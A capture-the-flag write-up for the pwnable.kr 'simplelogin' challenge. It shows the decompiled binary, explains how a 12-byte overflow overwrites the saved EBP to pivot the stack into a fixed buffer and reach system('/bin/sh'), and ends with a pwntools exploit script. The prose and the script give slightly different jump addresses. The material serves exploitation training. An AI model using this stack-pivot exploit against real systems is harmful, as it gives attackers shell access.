# Pwnable.kr SimpleLogin CTF Writeup

## Problem Description
The code for this challenge is:

### main
```c
0804930d  int32_t main()

0804932d      void var_32
0804932d      sub_80482e0(&var_32, 0, 0x1e)
08049352      _IO_setvbuf(_IO_stdout, 0, 2, 0)
08049377      _IO_setvbuf(_IO_stdin, 0, 1, 0)
08049383      _IO_printf("Authenticate : ")
0804938c      void* var_4c = &var_32
08049397      __isoc99_scanf("%30s")
080493b3      sub_80482e0(0x811eb40, 0, 0xc)
080493b8      char* var_38 = nullptr
080493cf      int32_t eax_2 = Base64Decode(&var_32, &var_38)
080493cf      
080493dd      if (eax_2 u> 0xc)
0804941a          _IO_puts("Wrong Length")
080493dd      else
080493f6          memcpy(&input, var_38, eax_2)
080493f6          
0804940a          if (auth(eax_2) == 1)
0804940c              correct()
0804940c              noreturn
0804940c      
08049425      return 0
```

### auth
```c
0804929c  int32_t auth(int32_t arg1)

080492ba      void var_c
080492ba      memcpy(&var_c, &input, arg1)
080492cd      void var_18
080492cd      void* eax_1 = calc_md5(&var_18, 0xc)
080492d8      void* var_28 = eax_1
080492e3      _IO_printf("hash : %s\n")
080492e3      
080492fd      if (sub_80482f0("f87cd601aa7fedca99018a8be88eda34", eax_1) != 0)
08049306          return 0
08049306      
080492ff      return 1
```

### correct
```c
0804925f  void correct() __noreturn

08049276      if (input == 0xdeadbeef)
0804927f          _IO_puts("Congratulation! you are good!")
0804928b          __libc_system("/bin/sh")
0804928b      
08049297      exit(nullptr)
08049297      noreturn
```

The program takes an input that is encoded with base64, copies it to a fixed memory address, decodes it, calculates its MD5 hash, compares it to a specific hash, and then checks if it equals `0xdeadbeef`. ASLR is enabled, but PIE is disabled, so the addresses of the program code do not change.

## Analysis
The `auth()` function starts like this:
```c
080492ba      void var_c
080492ba      memcpy(&var_c, &input, arg1)
```

When we disassemble the `auth()` function, we get this:
```asm
0804929c  int32_t auth(int32_t arg1)

0804929c  55                 push    ebp {__saved_ebp}
0804929d  89e5               mov     ebp, esp {__saved_ebp}
0804929f  83ec28             sub     esp, 0x28
080492a2  8b4508             mov     eax, dword [ebp+0x8 {arg1}]
080492a5  89442408           mov     dword [esp+0x8 {var_24}], eax
080492a9  c744240440eb1108   mov     dword [esp+0x4], input
080492b1  8d45ec             lea     eax, [ebp-0x14 {var_18}]
080492b4  83c00c             add     eax {var_c}, 0xc
080492b7  890424             mov     dword [esp {var_2c}], eax {var_c}
080492ba  e8a1030200         call    memcpy
```

We can see from these lines:
```asm
lea     eax, [ebp-0x14 {var_18}]
add     eax {var_c}, 0xc
```

That the buffer `var_c` (which will contain the input) is located at `[ebp-0x8]` (`-0x14 + 0xc = -0x8`). However, the maximum length we can give as input is 12 bytes. This means we can perform a buffer overflow on the stack.

The stack looks like this:
```
arg1
------------
return address
------------
saved ebp
------------
local variables
```

In our case, it will look like this:
```
ebp+0x8 -> arg1
------------
ebp+0x4 -> return address
------------
ebp     -> saved ebp
------------
ebp-0x8 -> input
```

Since we can only write 12 bytes, we can only overwrite the `saved ebp`. I thought about what I could do if I could override the `ebp`, and I came up with an idea. I can change the value of the `saved ebp` on the stack to the address of the buffer that holds the input (which is a fixed address). After that, I will write in the buffer 4 junk bytes and 4 bytes (`0x0804927f`) that are the address of these lines:
```c
0804927f          _IO_puts("Congratulation! you are good!")
0804928b          __libc_system("/bin/sh")
```

This is because when the program executes the `leave` instruction (when `auth()` ends), it does this:
```asm
mov esp, ebp
pop ebp
```

Then `ebp` will have the address we wrote. When returning to `main()`, the stack will be the buffer of the input. Since `auth()` returned 0, `main()` will exit just after returning from `auth()`, and it will execute the `leave; ret` instructions. The `leave` will pop the saved `ebp`, which is the first 4 bytes of the buffer. We don't need it for this exploit, so it will be a junk value. The `ret` instruction will do this:
```asm
pop eip
```

It will pop the next 4 bytes (the last 4 bytes of the buffer) and put them in `eip`. It will then jump to this address and run it. I put in the payload the address of `system("/bin/sh")`, so it should jump to it and run it. After that, we get a shell and can read the flag.

## Exploit Code
```python
from pwn import *
import base64

context.log_level = 'info'
context(os='linux', arch='i386')

session = ssh(user='simplelogin', host='pwnable.kr', port=2222, password='guest')
p = session.process(['nc', '0', '9003'])

payload = b"A" * 4  # EBP junk value
payload += p32(0x08049278)  # EIP address of system("/bin/sh")
payload += p32(0x0811eb40)  # Address of the buffer I write to
payload = base64.b64encode(payload)
print(payload)

p.sendline(payload)
p.interactive()
```
